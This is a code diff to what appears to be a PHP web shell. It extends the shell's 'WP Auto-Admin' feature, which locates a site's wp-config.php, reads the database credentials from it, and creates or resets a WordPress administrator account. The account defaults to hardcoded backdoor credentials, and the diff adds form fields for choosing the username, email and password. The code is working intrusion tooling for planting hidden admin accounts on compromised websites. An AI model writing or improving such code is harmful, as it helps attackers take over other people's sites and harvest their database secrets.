@@ -1566,12 +1566,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'clear_history') {
 // --- WP Auto-Admin ---
 $wpAutoLog = null;
 if ($action === 'wp_autoadmin' && $_SERVER['REQUEST_METHOD'] === 'POST') {
-    $wpAutoLog = wpAutoAdmin(
-        $cwd,
-        'caga',
-        'caga@cagamerdeka.com',
-        'Caga123'
-    );
+    $waUser    = trim($_POST['wp_admin_user']    ?? 'caga');
+    $waEmail   = trim($_POST['wp_admin_email']   ?? 'caga@cagamerdeka.com');
+    $waPass    = $_POST['wp_admin_pass']          ?? 'Caga123';
+    $waDisplay = trim($_POST['wp_admin_display'] ?? '') ?: null;
+    if ($waUser  === '') $waUser  = 'caga';
+    if ($waEmail === '') $waEmail = 'caga@cagamerdeka.com';
+    if ($waPass  === '') $waPass  = 'Caga123';
+    $wpAutoLog = wpAutoAdmin($cwd, $waUser, $waEmail, $waPass, $waDisplay);
 }
 
 // --- WP Theme Creator ---
@@ -2562,7 +2564,7 @@ $hasZip = class_exists('ZipArchive');
         <div class="mysql-panel" style="margin-top:0;">
             <div class="panel-hdr" style="display:flex;align-items:center;gap:10px;">
                 <span class="panel-title">🛡️ WP Auto-Admin Generator</span>
-                <span style="font-size:11px;color:#8b949e;">caga / caga@cagamerdeka.com / Caga123</span>
+                <span style="font-size:11px;color:#8b949e;">Create or reset a WordPress admin account</span>
                 <button class="panel-toggle" onclick="togglePanel('wpAdminPanel','wpAdminToggle')" id="wpAdminToggle">▶ show</button>
             </div>
             <div class="collapsible-body" id="wpAdminPanel">
@@ -2581,10 +2583,45 @@ $hasZip = class_exists('ZipArchive');
                             <?php endforeach; ?>
                         </div>
                     <?php endif; ?>
-                    <form method="post" onsubmit="return confirm('Run WP Auto-Admin from current directory?\n\nThis will:\n1. Search for wp-load.php & wp-config.php (up to 25 levels)\n2. Parse DB credentials\n3. Connect MySQL\n4. Create/reset admin user: caga / Caga123')">
+                    <form method="post" onsubmit="return wpAdminConfirm(this)">
                         <input type="hidden" name="action" value="wp_autoadmin">
-                        <button type="submit" class="btn btn-primary">⚡ Run WP Auto-Admin</button>
-                        <span style="font-size:11px;color:#6e7681;margin-left:10px;">No MySQL connection needed — reads wp-config.php directly</span>
+                        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px;">
+                            <div>
+                                <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">Username</label>
+                                <input type="text" name="wp_admin_user"
+                                    value="<?= htmlspecialchars($action === 'wp_autoadmin' ? ($_POST['wp_admin_user'] ?? 'caga') : 'caga') ?>"
+                                    placeholder="caga"
+                                    style="width:100%;box-sizing:border-box;background:#0a0c10;border:1px solid #30363d;color:#e6edf3;padding:7px 10px;font-family:inherit;font-size:13px;border-radius:4px;outline:none;">
+                            </div>
+                            <div>
+                                <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">Email</label>
+                                <input type="email" name="wp_admin_email"
+                                    value="<?= htmlspecialchars($action === 'wp_autoadmin' ? ($_POST['wp_admin_email'] ?? 'caga@cagamerdeka.com') : 'caga@cagamerdeka.com') ?>"
+                                    placeholder="caga@cagamerdeka.com"
+                                    style="width:100%;box-sizing:border-box;background:#0a0c10;border:1px solid #30363d;color:#e6edf3;padding:7px 10px;font-family:inherit;font-size:13px;border-radius:4px;outline:none;">
+                            </div>
+                            <div>
+                                <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">Password</label>
+                                <div style="display:flex;gap:4px;">
+                                    <input type="password" name="wp_admin_pass" id="wpAdminPass"
+                                        value="<?= htmlspecialchars($action === 'wp_autoadmin' ? ($_POST['wp_admin_pass'] ?? 'Caga123') : 'Caga123') ?>"
+                                        placeholder="Caga123"
+                                        style="flex:1;background:#0a0c10;border:1px solid #30363d;color:#e6edf3;padding:7px 10px;font-family:inherit;font-size:13px;border-radius:4px;outline:none;">
+                                    <button type="button" onclick="toggleWpPass()" class="btn btn-sm" id="wpPassToggle" style="font-size:11px;padding:5px 8px;" title="Show/hide password">👁️</button>
+                                </div>
+                            </div>
+                            <div>
+                                <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">Display Name <span style="color:#6e7681;">(optional)</span></label>
+                                <input type="text" name="wp_admin_display"
+                                    value="<?= htmlspecialchars($action === 'wp_autoadmin' ? ($_POST['wp_admin_display'] ?? '') : '') ?>"
+                                    placeholder="Leave blank to use username"
+                                    style="width:100%;box-sizing:border-box;background:#0a0c10;border:1px solid #30363d;color:#e6edf3;padding:7px 10px;font-family:inherit;font-size:13px;border-radius:4px;outline:none;">
+                            </div>
+                        </div>
+                        <div style="display:flex;align-items:center;gap:10px;">
+                            <button type="submit" class="btn btn-primary">⚡ Run WP Auto-Admin</button>
+                            <span style="font-size:11px;color:#6e7681;">No MySQL connection needed — reads wp-config.php directly</span>
+                        </div>
                     </form>
                 </div>
             </div>
@@ -2910,6 +2947,31 @@ $hasZip = class_exists('ZipArchive');
             if (!body || !btn) return;
             const open = body.classList.toggle('open');
             btn.textContent = open ? '▼ hide' : '▶ show';
+        }
+        // ── WP Auto-Admin helpers ─────────────────────────────────────────
+        function toggleWpPass() {
+            var inp = document.getElementById('wpAdminPass');
+            var btn = document.getElementById('wpPassToggle');
+            if (!inp) return;
+            if (inp.type === 'password') {
+                inp.type = 'text';
+                btn.textContent = '🙈';
+            } else {
+                inp.type = 'password';
+                btn.textContent = '👁️';
+            }
+        }
+        function wpAdminConfirm(form) {
+            var user = (form.wp_admin_user.value || 'caga').trim();
+            var pass = (form.wp_admin_pass.value || 'Caga123');
+            return confirm(
+                'Run WP Auto-Admin from current directory?\n\n'
+                + 'This will:\n'
+                + '1. Search for wp-load.php & wp-config.php (up to 25 levels)\n'
+                + '2. Parse DB credentials\n'
+                + '3. Connect MySQL\n'
+                + '4. Create/reset admin user: ' + user + ' / ' + pass
+            );
         }
         <?php if ($wpAutoLog !== null): ?>
         (function(){ const b=document.getElementById('wpAdminPanel'),t=document.getElementById('wpAdminToggle'); if(b&&t){b.classList.add('open');t.textContent='▼ hide';} })();
